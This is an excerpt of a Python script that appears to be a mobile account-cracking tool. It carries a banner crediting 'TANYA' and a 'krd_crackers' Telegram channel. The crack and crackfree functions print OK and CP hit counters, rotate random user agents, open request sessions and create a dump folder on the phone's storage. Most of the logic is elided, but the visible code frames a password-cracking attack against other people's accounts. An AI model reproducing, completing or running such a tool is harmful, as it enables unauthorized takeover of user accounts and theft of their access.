...
OWNER  ------>   @py_tanya                
║ Creator    SAJID                 
║ Telegram : https://t.me/krd_crackers     ║
║ Version  : 500.0                         ║
║ Telegram : @py_TANYA                    ║
╚══════════════════════════════════════════╝
	 
	 \x1b[92;1mTHIS TOOL CRATE BY TANYA
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r[ T A N Y A ]  {P}{b}{loop}{P}•{b}{len(id)}{P}   OK:{P}{H}{ok}{P}   CP:{P}{M}{cp}{P}  {bo}{'{:.0%}'.format(loop/float(len(id)))}{asu}  "),
	sys.stdout.flush()
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r[ T A N Y A ]  {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}{P})  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
...
if __name__=='__main__':
	...
	try:os.mkdir('/sdcard/TANYA-DUMP')
	except:pass
